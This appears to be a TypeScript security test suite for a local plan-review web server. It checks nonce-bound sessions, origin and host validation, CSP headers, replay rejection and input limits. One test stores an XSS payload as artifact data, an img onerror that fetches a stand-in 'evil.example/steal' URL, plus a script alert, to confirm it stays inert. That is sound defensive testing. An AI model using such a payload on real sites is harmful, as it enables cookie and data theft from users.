import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import {
  handleReviewSurface,
  isAuthorizedReviewMutation,
  parseRid,
  registerReviewSurface,
  type ReviewHookResult,
  type ReviewInput,
  type ReviewSurface,
} from "../src/engine/review.ts";

const ORIGIN = "http://127.0.0.1:43191";
const STRICT_HEADERS = { host: "127.0.0.1:43191", origin: ORIGIN };

type Harness = {
  cwd: string;
  surface: ReviewSurface;
  approvals: ReviewInput[];
  denials: ReviewInput[];
};

function harness(options: {
  approve?: () => ReviewHookResult;
  deny?: () => ReviewHookResult;
  throwApprove?: boolean;
  bundled?: boolean;
} = {}): Harness {
  const cwd = mkdtempSync(join(tmpdir(), "pi-hive-review-security-"));
  const changeDir = join(cwd, "openspec", "changes", "add-auth");
  mkdirSync(changeDir, { recursive: true });
  writeFileSync(join(changeDir, "proposal.md"), "# proposal\n");
  const htmlPath = join(cwd, "review.html");
  if (!options.bundled) writeFileSync(htmlPath, "<!doctype html><head><title>review</title></head><script type=\"module\" crossorigin>window.reviewBooted=true</script>");
  const approvals: ReviewInput[] = [];
  const denials: ReviewInput[] = [];
  const surface = registerReviewSurface({
    mountPath: "/pl-review/",
    ...(options.bundled ? {} : { htmlPath }),
    hooks: {
      resolveContext(rid, cwdParam) {
        const parsed = parseRid(rid);
        return parsed && cwdParam === cwd
          ? { cwd, change: parsed.change, artifact: parsed.artifact }
          : null;
      },
      onApprove(_ctx, input) {
        if (options.throwApprove) throw new Error("disk full");
        const result = options.approve?.() ?? { ok: true as const };
        if (result.ok) approvals.push(input);
        return result;
      },
      onDeny(_ctx, input) {
        const result = options.deny?.() ?? { ok: true as const };
        if (result.ok) denials.push(input);
        return result;
      },
    },
  });
  assert.ok(surface);
  return { cwd, surface: surface!, approvals, denials };
}

async function mint(h: Harness): Promise<{ response: Response; reviewUrl?: string }> {
  const req = new Request(`${ORIGIN}/review-sessions`, {
    method: "POST",
    headers: { ...STRICT_HEADERS, referer: `${ORIGIN}/`, "content-type": "application/json" },
    body: JSON.stringify({ rid: "add-auth#proposal.md", cwd: h.cwd }),
  });
  const response = (await handleReviewSurface(h.surface, req, new URL(req.url)))!;
  const body = await response.clone().json() as { reviewUrl?: string };
  return { response, reviewUrl: body.reviewUrl };
}

async function mintFrom(h: Harness, referer: string): Promise<{ response: Response; reviewUrl?: string; status: number; body: unknown }> {
  const req = new Request(`${ORIGIN}/review-sessions`, {
    method: "POST",
    headers: { ...STRICT_HEADERS, referer, "content-type": "application/json" },
    body: JSON.stringify({ rid: "add-auth#proposal.md", cwd: h.cwd }),
  });
  const response = (await handleReviewSurface(h.surface, req, new URL(req.url)))!;
  const body = await response.clone().json() as { reviewUrl?: string };
  return { response, reviewUrl: body.reviewUrl, status: response.status, body };
}

function decision(reviewUrl: string, path: "/api/approve" | "/api/deny" | "/api/feedback", body: string, headers: Record<string, string> = {}): Request {
  return new Request(`${ORIGIN}${path}`, {
    method: "POST",
    headers: {
      ...STRICT_HEADERS,
      referer: `${ORIGIN}${reviewUrl}`,
      "content-type": "application/json",
      ...headers,
    },
    body,
  });
}

async function handle(h: Harness, req: Request): Promise<Response | null> {
  return handleReviewSurface(h.surface, req, new URL(req.url));
}

test("review sessions require exact mutation metadata and are not cacheable", async () => {
  const h = harness();
  const headerless = new Request(`${ORIGIN}/review-sessions`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ rid: "add-auth#proposal.md", cwd: h.cwd }),
  });
  assert.equal((await handle(h, headerless))?.status, 403);

  const minted = await mint(h);
  assert.equal(minted.response.status, 201);
  assert.equal(minted.response.headers.get("cache-control"), "no-store");
  assert.match(minted.reviewUrl || "", /^\/pl-review\/\?rid=/);
  const page = new Request(`${ORIGIN}${minted.reviewUrl}`, { headers: { host: "127.0.0.1:43191" } });
  const pageResponse = (await handle(h, page))!;
  assert.equal(pageResponse.status, 200);
  assert.equal(pageResponse.headers.get("cache-control"), "no-store");
  assert.equal(pageResponse.headers.get("referrer-policy"), "no-referrer");
  const csp = pageResponse.headers.get("content-security-policy") || "";
  assert.match(csp, /script-src-attr 'none'/);
  assert.match(csp, /connect-src http:\/\/127\.0\.0\.1:43191/);
  assert.doesNotMatch(csp, /script-src [^;]*'unsafe-inline'/);
  const pageHtml = await pageResponse.text();
  assert.match(pageHtml, /__hive_nonce/);
  const nonce = /<script nonce="([a-f0-9]+)">/.exec(pageHtml)?.[1];
  assert.ok(nonce);
  assert.match(csp, new RegExp(`'nonce-${nonce}'`));
  assert.match(pageHtml, new RegExp(`<script type="module" crossorigin nonce="${nonce}">`));
  const copiedWithoutNonce = new URL(`${ORIGIN}${minted.reviewUrl}`);
  copiedWithoutNonce.searchParams.delete("nonce");
  const copied = new Request(copiedWithoutNonce, { headers: { host: "127.0.0.1:43191" } });
  assert.equal((await handle(h, copied))?.status, 401);
});

// ── /review-sessions origin binding ───────────────────────────────────────
//
// The dashboard mints review sessions from any page (Plans tab, agent log,
// change detail, …). The earlier pathname-strict check (`referer.pathname === "/"`)
// rejected legitimate fetches from `/project/<name>/plans` with 403 "invalid
// request origin", surfacing in the UI as "Secure review session unavailable."
// The fix relaxes /review-sessions to origin-only matching; the daemon-bearer
// auth and the strict pathname check on /api/approve|deny|feedback (which
// always run inside the /pl-review/ iframe) still defend the substantive
// surfaces.

test("/review-sessions accepts same-origin fetches from non-root pages (Plans tab flow)", async () => {
  const h = harness();
  // The dashboard's Plans tab lives at /project/<name>/plans, NOT "/". The
  // earlier check expected referer.pathname === "/" and rejected this case.
  const from = await mintFrom(h, `${ORIGIN}/project/smoke-test/plans`);
  assert.equal(from.status, 201, `expected 201, got ${from.status} body=${JSON.stringify(from.body)}`);
  assert.match(from.reviewUrl || "", /^\/pl-review\/\?rid=/);
});

test("/review-sessions still rejects cross-origin requests", async () => {
  const h = harness();
  const req = new Request(`${ORIGIN}/review-sessions`, {
    method: "POST",
    headers: {
      host: "127.0.0.1:43191",
      origin: "https://evil.example.com",
      referer: "https://evil.example.com/",
      "content-type": "application/json",
    },
    body: JSON.stringify({ rid: "add-auth#proposal.md", cwd: h.cwd }),
  });
  const response = (await handle(h, req))!;
  assert.equal(response.status, 403);
});

test("/review-sessions still rejects host-mismatched requests", async () => {
  const h = harness();
  const req = new Request(`${ORIGIN}/review-sessions`, {
    method: "POST",
    headers: {
      host: "evil.example.com:443",
      origin: ORIGIN,
      referer: `${ORIGIN}/`,
      "content-type": "application/json",
    },
    body: JSON.stringify({ rid: "add-auth#proposal.md", cwd: h.cwd }),
  });
  const response = (await handle(h, req))!;
  assert.equal(response.status, 403);
});

test("review-only bundle is gzip streamed with strong ETags", async () => {
  const h = harness({ bundled: true });
  const minted = await mint(h);
  const page = new Request(`${ORIGIN}${minted.reviewUrl}`, { headers: { host: "127.0.0.1:43191" } });
  const pageResponse = (await handle(h, page))!;
  assert.equal(pageResponse.status, 200);
  assert.equal(pageResponse.headers.get("content-encoding"), "gzip");
  assert.equal(pageResponse.headers.get("cache-control"), "private, no-cache");
  assert.match(pageResponse.headers.get("etag") || "", /^"sha256-[a-f0-9]{64}"$/);
  assert.match(pageResponse.headers.get("content-security-policy") || "", /script-src http:\/\/127\.0\.0\.1:43191/);

  const assetRequest = new Request(`${ORIGIN}/pl-review/assets/review.js`, { headers: { host: "127.0.0.1:43191" } });
  const asset = (await handle(h, assetRequest))!;
  assert.equal(asset.status, 200);
  assert.equal(asset.headers.get("content-encoding"), "gzip");
  assert.match(asset.headers.get("cache-control") || "", /immutable/);
  const etag = asset.headers.get("etag")!;
  const cached = new Request(assetRequest.url, { headers: { host: "127.0.0.1:43191", "if-none-match": etag } });
  assert.equal((await handle(h, cached))?.status, 304);
});

test("missing nonce and forged Referer never invoke decision hooks", async () => {
  const h = harness();
  const minted = await mint(h);
  const noNonceUrl = `/pl-review/?rid=${encodeURIComponent("add-auth#proposal.md")}&cwd=${encodeURIComponent(h.cwd)}`;
  const noNonce = decision(noNonceUrl, "/api/approve", JSON.stringify({ feedback: "forge" }));
  assert.equal(isAuthorizedReviewMutation(h.surface, noNonce, new URL(noNonce.url)), false);
  assert.equal((await handle(h, noNonce))?.status, 401);

  const forged = decision(minted.reviewUrl!, "/api/deny", JSON.stringify({ feedback: "forge" }), { referer: `${ORIGIN}/wrong?nonce=x` });
  assert.equal(isAuthorizedReviewMutation(h.surface, forged, new URL(forged.url)), false);
  assert.equal((await handle(h, forged))?.status, 403);
  const wrongHost = decision(minted.reviewUrl!, "/api/approve", JSON.stringify({ feedback: "forge" }), { host: "localhost:9999" });
  assert.equal(isAuthorizedReviewMutation(h.surface, wrongHost, new URL(wrongHost.url)), false);
  assert.equal((await handle(h, wrongHost))?.status, 403);
  assert.equal(h.approvals.length, 0);
  assert.equal(h.denials.length, 0);
});

test("an opaque sandbox origin uses query-bound capability without Referer", async () => {
  const h = harness();
  const { reviewUrl } = await mint(h);
  const capability = new URL(`${ORIGIN}${reviewUrl}`);
  const api = new URL(`${ORIGIN}/api/approve`);
  api.searchParams.set("__hive_rid", capability.searchParams.get("rid")!);
  api.searchParams.set("__hive_cwd", capability.searchParams.get("cwd")!);
  api.searchParams.set("__hive_nonce", capability.searchParams.get("nonce")!);
  const preflight = new Request(api, {
    method: "OPTIONS",
    headers: {
      host: "127.0.0.1:43191",
      origin: "null",
      "access-control-request-method": "POST",
      "access-control-request-headers": "content-type",
    },
  });
  assert.equal(isAuthorizedReviewMutation(h.surface, preflight, new URL(preflight.url)), true);
  const preflightResponse = (await handle(h, preflight))!;
  assert.equal(preflightResponse.status, 204);
  assert.equal(preflightResponse.headers.get("access-control-allow-origin"), "null");
  assert.equal(preflightResponse.headers.get("cross-origin-resource-policy"), "cross-origin");

  const req = new Request(api, {
    method: "POST",
    headers: { host: "127.0.0.1:43191", origin: "null", "content-type": "application/json" },
    body: JSON.stringify({ feedback: "sandboxed approval" }),
  });
  assert.equal(isAuthorizedReviewMutation(h.surface, req, new URL(req.url)), true);
  const response = (await handle(h, req))!;
  assert.equal(response.status, 200);
  assert.equal(response.headers.get("access-control-allow-origin"), "null");
  assert.equal(h.approvals.length, 1);
});

test("hostile artifact Markdown stays JSON data under restrictive review CSP", async () => {
  const h = harness();
  const hostile = `<img src=x onerror="fetch('https://evil.example/steal')"><script>alert(document.domain)</script>`;
  writeFileSync(join(h.cwd, "openspec", "changes", "add-auth", "proposal.md"), hostile);
  const { reviewUrl } = await mint(h);
  const capability = new URL(`${ORIGIN}${reviewUrl}`);
  const api = new URL(`${ORIGIN}/api/plan`);
  for (const key of ["rid", "cwd", "nonce"] as const) api.searchParams.set(`__hive_${key}`, capability.searchParams.get(key)!);
  const req = new Request(api, { headers: { host: "127.0.0.1:43191", origin: "null" } });
  const response = (await handle(h, req))!;
  assert.equal(response.status, 200);
  assert.match(response.headers.get("content-type") || "", /^application\/json/);
  assert.match(response.headers.get("content-security-policy") || "", /connect-src 'self'/);
  assert.equal((await response.json() as { plan: string }).plan, hostile);
});

test("a bound nonce authorizes one decision and rejects replay", async () => {
  const h = harness();
  const { reviewUrl } = await mint(h);
  const req = decision(reviewUrl!, "/api/approve", JSON.stringify({ feedback: "looks good" }));
  assert.equal(isAuthorizedReviewMutation(h.surface, req, new URL(req.url)), true);
  assert.equal((await handle(h, req))?.status, 200);
  assert.equal(h.approvals.length, 1);

  const replay = decision(reviewUrl!, "/api/approve", JSON.stringify({ feedback: "again" }));
  assert.equal(isAuthorizedReviewMutation(h.surface, replay, new URL(replay.url)), false);
  assert.equal((await handle(h, replay))?.status, 401);
  assert.equal(h.approvals.length, 1);
});

test("artifact changes make an authenticated review session stale", async () => {
  const h = harness();
  const { reviewUrl } = await mint(h);
  writeFileSync(join(h.cwd, "openspec", "changes", "add-auth", "proposal.md"), "# changed\n");
  const req = decision(reviewUrl!, "/api/approve", JSON.stringify({ feedback: "stale" }));
  // The capability passes the method gate so the handler can return 409 rather
  // than disguising authenticated staleness as an auth failure.
  assert.equal(isAuthorizedReviewMutation(h.surface, req, new URL(req.url)), true);
  assert.equal((await handle(h, req))?.status, 409);
  assert.equal(h.approvals.length, 0);
});

test("malformed feedback cannot default to denial", async () => {
  const h = harness();
  const first = await mint(h);
  const malformed = decision(first.reviewUrl!, "/api/feedback", "{bad json");
  assert.equal((await handle(h, malformed))?.status, 400);

  const missingDecision = decision(first.reviewUrl!, "/api/feedback", JSON.stringify({ feedback: "ambiguous" }));
  assert.equal((await handle(h, missingDecision))?.status, 400);
  assert.equal(h.denials.length, 0);
  assert.equal(h.approvals.length, 0);
});

test("review body limits reject excessive annotations and strings", async () => {
  const h = harness();
  const first = await mint(h);
  const annotations = Array.from({ length: 101 }, () => ({ comment: "x" }));
  assert.equal((await handle(h, decision(first.reviewUrl!, "/api/deny", JSON.stringify({ annotations }))))?.status, 400);

  const tooLong = "x".repeat(4_001);
  assert.equal((await handle(h, decision(first.reviewUrl!, "/api/deny", JSON.stringify({ feedback: tooLong }))))?.status, 400);
  const oversized = "x".repeat(65_000);
  assert.equal((await handle(h, decision(first.reviewUrl!, "/api/deny", JSON.stringify({ feedback: oversized }))))?.status, 400);
  assert.equal(h.denials.length, 0);
});

test("not-ready and persistence failures return 409 and 500", async () => {
  const notReady = harness({ approve: () => ({ ok: false, error: "automated review not ready" }) });
  const first = await mint(notReady);
  assert.equal((await handle(notReady, decision(first.reviewUrl!, "/api/approve", JSON.stringify({}))))?.status, 409);

  const failing = harness({ throwApprove: true });
  const second = await mint(failing);
  const response = await handle(failing, decision(second.reviewUrl!, "/api/approve", JSON.stringify({}))) as Response;
  assert.equal(response.status, 500);
  assert.equal(response.headers.get("cache-control"), "no-store");
});

// ── theme propagation on /review-sessions ────────────────────────────────────
//
// The dashboard passes its current `dark | light` theme to the server on
// mint, the server bakes it into the iframe URL's `theme` query param, and
// the iframe applies it on first paint. Without this, the iframe is dark
// even when the dashboard is in light mode, because the two documents
// don't share `:root[data-theme]`.

async function mintWithTheme(h: Harness, theme: unknown): Promise<string | undefined> {
  const req = new Request(`${ORIGIN}/review-sessions`, {
    method: "POST",
    headers: { ...STRICT_HEADERS, referer: `${ORIGIN}/`, "content-type": "application/json" },
    body: JSON.stringify({ rid: "add-auth#proposal.md", cwd: h.cwd, theme }),
  });
  const response = (await handleReviewSurface(h.surface, req, new URL(req.url)))!;
  if (response.status !== 201) return undefined;
  const body = await response.clone().json() as { reviewUrl?: string };
  return body.reviewUrl;
}

test("review-sessions: theme=light bakes into the iframe URL", async () => {
  const h = harness();
  const url = await mintWithTheme(h, "light");
  assert.ok(url, "mint should succeed");
  // The `theme=light` query param appears verbatim so the iframe's initial
  // paint matches the dashboard's active theme. The iframe's review.js
  // reads ?theme=... and mirrors it onto document.documentElement.dataset.theme.
  assert.match(url!, /[?&]theme=light(?:&|$)/);
  // ...and the dark default is NOT also emitted (would be redundant).
  assert.doesNotMatch(url!, /[?&]theme=dark(?:&|$)/);
});

test("review-sessions: theme=dark bakes into the iframe URL", async () => {
  const h = harness();
  const url = await mintWithTheme(h, "dark");
  assert.ok(url);
  assert.match(url!, /[?&]theme=dark(?:&|$)/);
});

test("review-sessions: missing theme defaults to dark in the URL", async () => {
  // Pre-fix, the URL had no theme at all and the iframe rendered dark.
  // Post-fix, the URL always carries `theme=...` so the iframe's behavior
  // is explicit even when the dashboard didn't say which it wanted.
  const h = harness();
  const url = await mintWithTheme(h, undefined);
  assert.ok(url);
  assert.match(url!, /[?&]theme=dark(?:&|$)/);
});

test("review-sessions: invalid theme values default to dark (fail-closed)", async () => {
  // The dashboard never sends anything other than "dark" | "light", but
  // the server must not trust untyped input. A bogus theme is coerced to
  // the dark default rather than crashing or passing through a value the
  // iframe can't validate.
  const h = harness();
  for (const bogus of ["red", "high-contrast", null, 42, {}]) {
    const url = await mintWithTheme(h, bogus);
    assert.ok(url, `mint with bogus theme ${JSON.stringify(bogus)} should still succeed`);
    assert.match(url!, /[?&]theme=dark(?:&|$)/, `bogus theme ${JSON.stringify(bogus)} should coerce to dark`);
  }
});
